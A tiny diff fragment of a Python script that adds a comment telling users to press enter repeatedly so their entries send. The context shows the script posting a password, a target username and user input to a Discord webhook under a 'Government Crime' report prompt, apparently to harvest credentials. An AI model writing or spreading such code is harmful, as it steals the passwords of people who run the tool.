@@ -31,3 +31,4 @@ if __name__ == "__main__":
     choice = input(ConsoleColors.OKBLUE + "Government Crime#1." + ConsoleColors.ENDC)
 
     send_to_discord_webhook(webhook_url, user_input, target_username, password)
+# After Entering the Info, please click enter button 2 or 3 times for it to send
